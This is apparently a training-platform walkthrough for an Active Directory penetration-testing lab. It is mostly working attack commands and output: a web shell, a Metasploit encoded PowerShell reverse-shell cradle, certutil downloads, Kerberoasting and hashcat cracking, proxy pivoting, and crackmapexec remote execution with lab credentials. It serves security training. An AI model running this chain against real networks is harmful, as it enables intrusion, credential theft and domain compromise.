
---

## Scenario

A team member started an External Penetration Test and was moved to another urgent project before they could finish. The team member was able to find and exploit a file upload vulnerability after performing recon of the externally-facing web server. Before switching projects, our teammate left a password-protected web shell (with the credentials: `admin:My_W3bsH3ll_P@ssw0rd!`) in place for us to start from in the `/uploads` directory. As part of this assessment, our client, Inlanefreight, has authorized us to see how far we can take our foothold and is interested to see what types of high-risk issues exist within the AD environment. Leverage the web shell to gain an initial foothold in the internal network. Enumerate the Active Directory environment looking for flaws and misconfigurations to move laterally and ultimately achieve domain compromise.

Apply what you learned in this module to compromise the domain and answer the questions below to complete part I of the skills assessment.

---

# AD Enumeration & Attacks - Skills Assessment Part I

## Question 1

### "Submit the contents of the flag.txt file on the administrator Desktop of the web server"

Students need to read the scenario to learn about the web shell located at `/uploads/`, and then access the web shell at the `http://STMIP/uploads/antak.aspx` with the credentials `admin:My_W3bsH3ll_P@ssw0rd!`:

![Active_Directory_Enumeration_&_Attacks_Walkthrough_Image_20.png](https://academy.hackthebox.com/storage/walkthroughs/38/Active_Directory_Enumeration_&_Attacks_Walkthrough_Image_20.png)

Students need to use the web-based PowerShell to read the first flag from `c:\users\administrator\desktop\flag.txt`:


```powershell
cat c:\users\administrator\desktop\flag.txt
```


```powershell-session
PS> cat c:\users\administrator\desktop\flag.txt

JusT_g3tt1ng_st@rt3d!
```

Answer: {hidden}

## Question 2

### "Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer"

Students need to elevate their functionalities by getting a reverse shell, using `msfconsole` and the `web_delivery` exploit:


```shell
sudo msfconsole -q
search web_delivery
use 1
```


```shell-session
┌─[us-academy-2]─[10.10.14.13]─[htb-ac543@htb-xmfpdttaiy]─[~]
└──╼ [★]$ sudo msfconsole -q

[msf](Jobs:0 Agents:0) >> search web_delivery

Matching Modules
================

   #  Name                                                        Disclosure Date  Rank       Check  Description
   -  ----                                                        ---------------  ----       -----  -----------
   0  exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
   1  exploit/multi/script/web_delivery                           2013-07-19       manual     No     Script Web Delivery


Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/script/web_delivery

[msf](Jobs:0 Agents:0) >> use 1
[*] Using configured payload python/meterpreter/reverse_tcp
```

Then, students need to set the options of the module accordingly:


```shell
set payload windows/x64/meterpreter/reverse_tcp
set LHOST PWNIP
set SRVHOST PWNIP
set TARGET 2
exploit
```

```shell-session
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set payload windows/x64/meterpreter/reverse_tcp

payload => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set LHOST 10.10.14.13
LHOST => 10.10.14.13
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set SRVHOST 10.10.14.13
SRVHOST => 10.10.14.13
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set TARGET 2
TARGET => 2
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.13:4444 
[*] Using URL: http://10.10.14.13:8080/EsPk6AcDPr
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABpAHIAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAaQByAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAaQByAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQAzADoAOAAwADgAMAAvAEUAcwBQAGsANgBBAGMARABQAHIALwB6AHMARAA1AFMAVQB0AG0ASAAyAHYASwBWACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAxADMAOgA4ADAAOAAwAC8ARQBzAFAAawA2AEEAYwBEAFAAcgAnACkAKQA7AA==
```

Students need to copy and paste the encoded PowerShell command into the `Antak` web shell. Checking `msfconsole`, students will see a `meterpreter` session has been opened. Next, students need to enumerate processes and migrate `meterpreter` to a more stable process, `winlogon.exe`:

Code: shell

```shell
ps
getpid
migrate <winlogin.exe pid>
```

  AD Enumeration & Attacks - Skills Assessment Part I

```shell-session
meterpreter > ps

Process List
============
PID   PPID  Name         Arch  Session  User               Path
---   ----  ----         ----  -------  ----               ----
0     0     [System Pro
cess]
4     0     System       x64   0
104   4     Registry     x64   0
312   4     smss.exe     x64   0
368   648   svchost.exe  x64   0        NT AUTHORITY\LOCA  C:\Windows\System3
L SERVICE          2\svchost.exe
396   388   csrss.exe    x64   0
504   388   wininit.exe  x64   0
512   496   csrss.exe    x64   1
568   496   winlogon.ex  x64   1        NT AUTHORITY\SYST  C:\Windows\System3
e                           EM                 2\winlogon.exe
624   648   svchost.exe  x64   0        NT AUTHORITY\NETW  C:\Windows\System3


meterpreter > getpid
Current pid: 2868
meterpreter > migrate 568
[*] Migrating from 2868 to 568...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Subsequently, students need to transfer [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) to the WEB01 machine, starting a Python web server from `Pwnbox`/`PMVPN`:

Code: shell

```shell
wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
python3 -m http.server PWNPO
```

  AD Enumeration & Attacks - Skills Assessment Part I

```shell-session
┌─[us-academy-2]─[10.10.14.13]─[htb-ac543@htb-xmfpdttaiy]─[~]
└──╼ [★]$ wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
┌─[us-academy-2]─[10.10.14.13]─[htb-ac543@htb-xmfpdttaiy]─[~]
└──╼ [★]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

From the WEB01 `meterpreter`, students need to drop to a command shell and download `PowerView` using `certutil.exe`. Finally, students can import the module and search for domain users with SPNs; students will find `svc_sql` as the Kerberoastable account:

Code: shell

```shell
shell
cd C:\
certutil.exe -f -urlcache -split http://PWNIP:PWNPO/PowerView.ps1 PowerView.ps1
powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -SPN | select samaccountname
```

  AD Enumeration & Attacks - Skills Assessment Part I

```shell-session
(Meterpreter 1)(C:\Windows\system32) > shell

Process 3840 created.
Channel 4 created.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\
cd C:\

C:\>certutil.exe -f -urlcache -split http://10.10.14.13:8000/PowerView.ps1 PowerView.ps1
certutil.exe -f -urlcache -split http://10.10.14.13:8000/PowerView.ps1 PowerView.ps1
****  Online  ****
  000000  ...
  0bc0e7
CertUtil: -URLCache command completed successfully.

C:\>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\> Import-Module .\PowerView.ps1
Import-Module .\PowerView.ps1
PS C:\> Get-DomainUser * -SPN | select samaccountname
Get-DomainUser * -SPN | select samaccountname

samaccountname
--------------
azureconnect  
backupjob     
krbtgt        
sqltest       
sqlqa         
sqldev        
svc_sql       
sqlprod       
```

Answer: {hidden}

# AD Enumeration & Attacks - Skills Assessment Part I

## Question 3

### "Crack the account's password. Submit the cleartext value."

Using the previously established `meterpreter` session, students need to kerberoast the `svc_sql` account to obtain its hash:

Code: shell

```shell
Get-DomainUser -identity svc_sql | get-domainspnticket -format hashcat
```

  AD Enumeration & Attacks - Skills Assessment Part I

```shell-session
PS C:\> Get-DomainUser -identity svc_sql | get-domainspnticket -format hashcat
Get-DomainUser -identity svc_sql | get-domainspnticket -format hashcat

SamAccountName       : svc_sql
DistinguishedName    : CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
ServicePrincipalName : MSSQLSvc/SQL01.inlanefreight.local:1433
TicketByteHexStream  : 
Hash                 : $krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$0A3867FF933AD2
                       5DED73373BEE0B3FB9$1977669A45F691C9FBC9F874DF7D76DB563578A2D15BB8D9FAE83777C118C161B2FBF3A95BB20
                       7E852624D2445290D2DB263E323EC51D01AD05F65F4B3B026FE4D8AAA47075630A838304BC6B9EF3AE1C812C8B3D98F6
                       77F78980E534D09539C244D7265A7CE5AB6EB4199C7E1FA948F9D2694B3B50A712925E87C45D1E124F5594810D188188
                       E5B8CAC54AF0C53D5EFF2B4049E25687F4EA1139F0C3D3DE0B1CB564EDAD172A537A8850D63C1C77E8920046EFB26241
                       BF3F7B161ADA3B2BC4A742950F173AD93B4559F3855DB73059239D22280CC7A93F3890932D885A3C30BA6AB21688CEB7
                       7889A06FF33914CCB29AD3B201A5D83DACD40E2683A0A4AB9B0CC6D749B18E66D43E02DE9F628ADE9E4B88B410EE6523
                       268450793C9B4AFE28E0DEDA975740200F0C9E9FFE9627EE91E7915FD9144BC605BF6C05B38CBC8B3DB59F81458ECE08
                       3BE115AE9D0CEFB20DA896E39D3DC67355495FD00EE8853EED2189C1A7F2FCEDD0B86E3C1AC1B9D8D5E9F23B33BCB84B
                       54268A83826EA653C1767B0EE0E31D8AA13DB3DF9BFEEBBEF3B033659CF98904229FCADDBB57F1C78AFB548EDB2D0392
                       84F76933F5043D3EBD9C964559AF8EF31C42CBC3398604C3A3DD568E1036DF3D91195DA1683A9BB07D5C0FE34D6E9EEE
                       2F0BEE5ADF636547CB57DD2427517340A68BA2F865264846DE286B394642FC7AC279639B8CDF17A2FE4805D6AD2B6C52
                       DD11552F13CD8606D2AEDD3E853E34242BB7622331EE1E9CF4FA666F1276FF0FFB9ED081EB4CD0BCA3E0CE585D2F7025
                       7E8EB7E99C36403BC4F7356603D6A614572DB48CD9A2021CCDB3E875DABB06040FEB8621D77101931CBF66FF045A212F
                       E7BC43917EA0BB734A8BAAAFC77814D4AF11B347232FB3A5B7A653650CEF3FDC78B6B91101F6FBE29232047570FD4996
                       069B4661BE82E19A52059138B96B93C3BA5ED725BCD5D04441159872B6AA01170CAEDB3456CA6F4C7992ADBB35FC1C48
                       4763504AD35D54B079E8A5102C3233C600E38270CE6447697D9A8718BB1ACFED214D6B1D2676B245BD6BC3A217F66E72
                       AFE907E4DCCED8CB86EA978A7A1C429D6731E32A04E2F20B4E3F608C220DF4360CCE80F2EDE10729D1332F482F718DEC
                       637C70E1BC801ACDCDEEB804E2E569F80F9032932EA632DB286B3DFCB9CD7DEED5C751D412A4F1B9D184EEBE5C68162E
                       5DB94EADA75C3607189ADFFE71A58C4F528418B4D20081DAC73A69130FCC2E898A5DB96619311003B0F1993BC724652A
                       9B37DB5B99DC4B29B7CC2A61DB4B177A7219082B2FF0BCD16573E079249D31FD71FDCFB6BE069BF8569954E368E6194B
                       DCDCFDB705F6C25372A7DA6A0AEDBA680FE4DBC69FC2EEA15EF805B2B2F19BD9B52EB385B51E181CA08583A1C058451A
                       DB784CA3E6BCC9D8865F8B710F1E052D5D42866C8C1E361AAECA224082A8B62700C0026E4FF6841FA4CC66C4794CCFAD
                       3DC72AEBCD8B080F12278813442C36B3E0874FBAF7C0B404BDD4D03A333C81A0B9B
```

Students need to copy the hash, and then paste into a file, formatting it to remove additional spaces:

Code: shell

```shell
echo "$krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$0A3867FF933AD2
                       5DED73373BEE0B3FB9$1977669A45F691C9FBC9F874DF7D76DB563578A2D15BB8D9FAE83777C118C161B2FBF3A95BB20
                       7E852624D2445290D2DB263E323EC51D01AD05F65F4B3B026FE4D8AAA47075630A838304BC6B9EF3AE1C812C8B3D98F6
                       77F78980E534D09539C244D7265A7CE5AB6EB4199C7E1FA948F9D2694B3B50A712925E87C45D1E124F5594810D188188
                       E5B8CAC54AF0C53D5EFF2B4049E25687F4EA1139F0C3D3DE0B1CB564EDAD172A537A8850D63C1C77E8920046EFB26241
                       BF3F7B161ADA3B2BC4A742950F173AD93B4559F3855DB73059239D22280CC7A93F3890932D885A3C30BA6AB21688CEB7
                       7889A06FF33914CCB29AD3B201A5D83DACD40E2683A0A4AB9B0CC6D749B18E66D43E02DE9F628ADE9E4B88B410EE6523
                       268450793C9B4AFE28E0DEDA975740200F0C9E9FFE9627EE91E7915FD9144BC605BF6C05B38CBC8B3DB59F81458ECE08
                       3BE115AE9D0CEFB20DA896E39D3DC67355495FD00EE8853EED2189C1A7F2FCEDD0B86E3C1AC1B9D8D5E9F23B33BCB84B
                       54268A83826EA653C1767B0EE0E31D8AA13DB3DF9BFEEBBEF3B033659CF98904229FCADDBB57F1C78AFB548EDB2D0392
                       84F76933F5043D3EBD9C964559AF8EF31C42CBC3398604C3A3DD568E1036DF3D91195DA1683A9BB07D5C0FE34D6E9EEE
                       2F0BEE5ADF636547CB57DD2427517340A68BA2F865264846DE286B394642FC7AC279639B8CDF17A2FE4805D6AD2B6C52
                       DD11552F13CD8606D2AEDD3E853E34242BB7622331EE1E9CF4FA666F1276FF0FFB9ED081EB4CD0BCA3E0CE585D2F7025
                       7E8EB7E99C36403BC4F7356603D6A614572DB48CD9A2021CCDB3E875DABB06040FEB8621D77101931CBF66FF045A212F
                       E7BC43917EA0BB734A8BAAAFC77814D4AF11B347232FB3A5B7A653650CEF3FDC78B6B91101F6FBE29232047570FD4996
                       069B4661BE82E19A52059138B96B93C3BA5ED725BCD5D04441159872B6AA01170CAEDB3456CA6F4C7992ADBB35FC1C48
                       4763504AD35D54B079E8A5102C3233C600E38270CE6447697D9A8718BB1ACFED214D6B1D2676B245BD6BC3A217F66E72
                       AFE907E4DCCED8CB86EA978A7A1C429D6731E32A04E2F20B4E3F608C220DF4360CCE80F2EDE10729D1332F482F718DEC
                       637C70E1BC801ACDCDEEB804E2E569F80F9032932EA632DB286B3DFCB9CD7DEED5C751D412A4F1B9D184EEBE5C68162E
                       5DB94EADA75C3607189ADFFE71A58C4F528418B4D20081DAC73A69130FCC2E898A5DB96619311003B0F1993BC724652A
e                      3DC72AEBCD8B080F12278813442C36B3E0874FBAF7C0B404BDD4D03A333C81A0B9B" | tr -d "[:space:]"  > tgs_file
```

  AD Enumeration & Attacks - Skills Assessment Part I

```shell-session
echo '$krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$0A3867FF933AD2
                       5DED73373BEE0B3FB9$1977669A45F691C9FBC9F874DF7D76DB563578A2D15BB8D9FAE83777C118C161B2FBF3A95BB20
                       7E852624D2445290D2DB263E323EC51D01AD05F65F4B3B026FE4D8AAA47075630A838304BC6B9EF3AE1C812C8B3D98F6
                       77F78980E534D09539C244D7265A7CE5AB6EB4199C7E1FA948F9D2694B3B50A712925E87C45D1E124F5594810D188188
                       E5B8CAC54AF0C53D5EFF2B4049E25687F4EA1139F0C3D3DE0B1CB564EDAD172A537A8850D63C1C77E8920046EFB26241
                       BF3F7B161ADA3B2BC4A742950F173AD93B4559F3855DB73059239D22280CC7A93F3890932D885A3C30BA6AB21688CEB7
                       7889A06FF33914CCB29AD3B201A5D83DACD40E2683A0A4AB9B0CC6D749B18E66D43E02DE9F628ADE9E4B88B410EE6523
                       268450793C9B4AFE28E0DEDA975740200F0C9E9FFE9627EE91E7915FD9144BC605BF6C05B38CBC8B3DB59F81458ECE08
                       3BE115AE9D0CEFB20DA896E39D3DC67355495FD00EE8853EED2189C1A7F2FCEDD0B86E3C1AC1B9D8D5E9F23B33BCB84B
                       54268A83826EA653C1767B0EE0E31D8AA13DB3DF9BFEEBBEF3B033659CF98904229FCADDBB57F1C78AFB548EDB2D0392
                       84F76933F5043D3EBD9C964559AF8EF31C42CBC3398604C3A3DD568E1036DF3D91195DA1683A9BB07D5C0FE34D6E9EEE
                       2F0BEE5ADF636547CB57DD2427517340A68BA2F865264846DE286B394642FC7AC279639B8CDF17A2FE4805D6AD2B6C52
                       DD11552F13CD8606D2AEDD3E853E34242BB7622331EE1E9CF4FA666F1276FF0FFB9ED081EB4CD0BCA3E0CE585D2F7025
                       7E8EB7E99C36403BC4F7356603D6A614572DB48CD9A2021CCDB3E875DABB06040FEB8621D77101931CBF66FF045A212F
                       E7BC43917EA0BB734A8BAAAFC77814D4AF11B347232FB3A5B7A653650CEF3FDC78B6B91101F6FBE29232047570FD4996
                       069B4661BE82E19A52059138B96B93C3BA5ED725BCD5D04441159872B6AA01170CAEDB3456CA6F4C7992ADBB35FC1C48
                       4763504AD35D54B079E8A5102C3233C600E38270CE6447697D9A8718BB1ACFED214D6B1D2676B245BD6BC3A217F66E72
                       AFE907E4DCCED8CB86EA978A7A1C429D6731E32A04E2F20B4E3F608C220DF4360CCE80F2EDE10729D1332F482F718DEC
                       637C70E1BC801ACDCDEEB804E2E569F80F9032932EA632DB286B3DFCB9CD7DEED5C751D412A4F1B9D184EEBE5C68162E
                       5DB94EADA75C3607189ADFFE71A58C4F528418B4D20081DAC73A69130FCC2E898A5DB96619311003B0F1993BC724652A
e                      3DC72AEBCD8B080F12278813442C36B3E0874FBAF7C0B404BDD4D03A333C81A0B9B' | tr -d "[:space:]" > tgs_file
```

Finally, students need to crack the hash with `Hashcat`, utilizing hashmode 13100; the password is revealed to be `lucky7`:

Code: shell

```shell
hashcat -m 13100 tgs_file /usr/share/wordlists/rockyou.txt 
```

  AD Enumeration & Attacks - Skills Assessment Part I

```shell-session
hashcat -m 13100 tgs_file /usr/share/wordlists/rockyou.txt 

<SNIP>

$krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$2f520ef267b5dc8b8c0486deac8a1ac6$9d6b54497f2d45ddb9649e77bc26ee02f8a888275d51c1cb1f10b5365728168536bdf82e3f384a99c55cffb0f38901150a8e248966b818d93347c8e203ff31e331ace4100f85e5974977e5598c23b232761f8ac9ad120b2ca98f73893b7bcbf4a5d0c5829be301a31833de37464bec9d06cb8b2957e79a54feaf5ea941cb54beadc03fd2c89b6c33e5b41c98b55742fa0c44f12658998d44b7b93d29568b04cc592e3c5615912d8211d68314e5de9edc02b21421009f287d33853c90a64cc4962ba658c6c9be2c9e68ef7c6fc40a30feb85b652e0f1e95900422fa1a53dafacdaacd6c4c1d890e4945dc312c2846df6f11a2a1d6b5e4b7c2a23d19c05566e1428b07bc82fac17beb5156932709564a50bb165cb920bf674e74634e69486d14591f3e7d9cd8124bc283e9328d4d446dde2e768b50f5018cc5754dd66c4801096c5369c6a764d068aedf9c8bd3a48e90d0a003df308bd8767af7e857b87d849d8431fe1fdc9d41e47dcdc82da5a15741b13aa078f8a8f646ca99ec1936c7729a32359bee27c4228b034f1c8722ceaef6d41f35540db2d3537d0b46402f773ae1fdecae08325b26236ec7388db59e6ae119a30e337cae78e768a28e7c38109b2949491ac5de7a1fc3dfabcb90cd0ae7b44d3acdcaf104c2b4295a1c8d7ec1b7fe4fc5e6f2630c5312343c8b24e4d7e950631f30ac9c39353c14c4807051568af0614f5f003e79690560afaa00224fba1a1328ecfde2a797502195f8d5aa004539b4da066c9856aa31bd81a9ece1dd0f41ffdf43d42f7e861a475782050fd0205871f9e67265f0eb3bcbeef44f20972c86cce2d5124d3781b3ec5a4ee8b973cf5a5bc13df3df59ee7788a48bb0cd10fa3523efeb3ae3936def6cffbed8dcf41120f11d10aeee13d116437e868bcfb797b873a03303a577ec80f975ae62695700d6729aaea47af3d4f3dbed9f668c7aec643667ded2b1d5912d6ae0ecf364cf27c51d65ca7977588f341a18d61a3dce746c8ea8e997a53d17be78e813516db8d53c84d683b9ee89c8f206943c31b49e269c9e2f8dd60a3f5ef740cec719725e7cee39c8200df0e49115419efedb6128b7b050cf44fa813745a897f156b75a4ca2d833066af9b5a071cd2ab9e4f0ff82d4a08c53a3306dece8d2f030c45449db0ed3a1c2177080f0dc01119b66a8fca13a8b32baf308846445fcc2aae702aa9a681bbf5c90eb83825acc62dd04bc2c8ee9bc4e8098ab6e6dd0aabad3aad0ac34029293c0ff6bb0ef395b17aa8da8e9f055da0fecc168ccd434a8d18656be1de9fa6d4c2f80944161534618effd6cfd059cb72467e3bf04a54c8814de9991b5f0cb7b3d527ddc24db43486499b7ae37d388bc5d2b14fd10bc295a62ab0c79fc310a21726d2e314e7e7599cc492f6fcb9ce8dbad82f882fd1ac2f1f88ec7e623e7f68df88b1b9bac49bfd898f8a031c20750f4b7e45f463d1c56094d38248a964b8951b9d648d1dcaddd054a042272c1b5dc8f56dfd1f20ddc935a73:lucky7
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/S...935a73
Time.Started.....: Thu Apr 21 17:06:26 2022 (0 secs)
Time.Estimated...: Thu Apr 21 17:06:26 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    95198 H/s (12.65ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 16384/14344385 (0.11%)
Rejected.........: 0/16384 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> cocoliso

Started: Thu Apr 21 17:05:29 2022
Stopped: Thu Apr 21 17:06:27 2022
```

Answer: {hidden}

# AD Enumeration & Attacks - Skills Assessment Part I

## Question 4

### "Submit the contents of the flag.txt file on the Administrator desktop on MS01"

Students need to use WEB01 as a pivot host into the 172.16.6.0/24 network using `meterpreter`:

Code: shell

```shell
run autoroute -s 172.16.6.0/24
```

  AD Enumeration & Attacks - Skills Assessment Part I

```shell-session
meterpreter > run autoroute -s 172.16.6.0/24

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.6.0/255.255.255.0...
[+] Added route to 172.16.6.0/255.255.255.0 via 10.129.202.242
[*] Use the -p option to list all active routes
```

Then, students can use the `auxiliary/scanner/portscan/tcp` module to look for hosts on the internal network, scanning for ports 139,445 as they are common Windows ports and can have implications for remote code execution:

Code: shell

```shell
bg
use auxiliary/scanner/portscan/tcp
set rhosts 172.16.6.0/24
set PORTS 139,445
set threads 50
run
```

  AD Enumeration & Attacks - Skills Assessment Part I

```shell-session
(Meterpreter 1)(C:\) > bg

[*] Backgrounding session 2...
msf6 exploit(multi/script/web_delivery) > use auxiliary/scanner/portscan/tcp 
msf6 auxiliary(scanner/portscan/tcp) > set rhosts 172.16.6.0/24
rhosts => 172.16.6.0/24
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 139,445
PORTS => 139,445
msf6 auxiliary(scanner/portscan/tcp) > set threads 50
threads => 50
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 172.16.6.3:           - 172.16.6.3:139 - TCP OPEN
[+] 172.16.6.3:           - 172.16.6.3:445 - TCP OPEN
[+] 172.16.6.50:          - 172.16.6.50:139 - TCP OPEN
[+] 172.16.6.50:          - 172.16.6.50:445 - TCP OPEN
[*] 172.16.6.0/24:        - Scanned  26 of 256 hosts (10% complete)
[+] 172.16.6.100:         - 172.16.6.100:445 - TCP OPEN
[+] 172.16.6.100:         - 172.16.6.100:139 - TCP OPEN
[*] 172.16.6.0/24:        - Scanned  52 of 256 hosts (20% complete)
```

Subsequently, students need to set up a SOCKS proxy in `msfconsole`:

Code: shell

```shell
use auxiliary/server/socks_proxy
show options
run
```

  AD Enumeration & Attacks - Skills Assessment Part I

```shell-session
msf6 auxiliary(scanner/portscan/tcp) > use auxiliary/server/socks_proxy 
msf6 auxiliary(server/socks_proxy) > show options 

Module options (auxiliary/server/socks_proxy):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   SRVHOST   0.0.0.0          yes       The address to listen on
   SRVPORT   1080             yes       The port to listen on
   USERNAME                   no        Proxy username for SOCKS5 listener
   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)

Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server

msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 5.

[*] Starting the SOCKS proxy server
```

Students also need to edit `/etc/proxchains.conf`, adding the socks5 proxy entry to the bottom of the config file:

Code: shell

```shell
sudo nano /etc/proxychains.conf
```

  AD Enumeration & Attacks - Skills Assessment Part I

```shell-session
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4         127.0.0.1 9050
socks5          127.0.0.1 1080
```

Afterward, students need to use `ProxyChains` to run commands against the 172.16.6.0/24 network. Students will need to authenticate to SMB on 172.16.6.50 uitilizing the credentials `svc_sql:lucky7`:

Code: shell

```shell
sudo proxychains cme smb 172.16.6.50 -u svc_sql -p lucky7
```

  AD Enumeration & Attacks - Skills Assessment Part I

```shell-session
┌─[us-academy-2]─[10.10.14.204]─[htb-ac543@htb-g4gbrbdlht]─[~]
└──╼ [★]$ sudo proxychains cme smb 172.16.6.50 -u svc_sql -p lucky7

ProxyChains-3.1 (http://proxychains.sf.net)
/root/.local/pipx/venvs/crackmapexec/lib/python3.9/site-packages/paramiko/transport.py:236: CryptographyDeprecationWarning: Blowfish has been deprecated
  "class": algorithms.Blowfish,
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:135-<><>-OK
SMB         172.16.6.50     445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
SMB         172.16.6.50     445    MS01             [+] INLANEFREIGHT.LOCAL\svc_sql:lucky7 (Pwn3d!)
```

Then, using `crackmapexec`, students can read the flag file from the directory `C:\users\administrator\desktop\`, finding it to be `spn$_r0ast1ng_on_@n_0p3n_f1re`:

Code: shell

```shell
sudo proxychains cme smb 172.16.6.50 -u svc_sql -p lucky7 -x "type C:\users\administrator\desktop\flag.txt"
```

  AD Enumeration & Attacks - Skills Assessment Part I

```shell-session
┌─[us-academy-2]─[10.10.14.204]─[htb-ac543@htb-g4gbrbdlht]─[~]
└──╼ [★]$ sudo proxychains cme smb 172.16.6.50 -u svc_sql -p lucky7 -x "type C:\users\administrator\desktop\flag.txt"

ProxyChains-3.1 (http://proxychains.sf.net)
/root/.local/pipx/venvs/crackmapexec/lib/python3.9/site-packages/paramiko/transport.py:236: CryptographyDeprecationWarning: Blowfish has been deprecated
  "class": algorithms.Blowfish,
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:135-<><>-OK
SMB         172.16.6.50     445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:445-<><>-OK
SMB         172.16.6.50     445    MS01             [+] INLANEFREIGHT.LOCAL\svc_sql:lucky7 (Pwn3d!)
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.50:135-<><>-OK
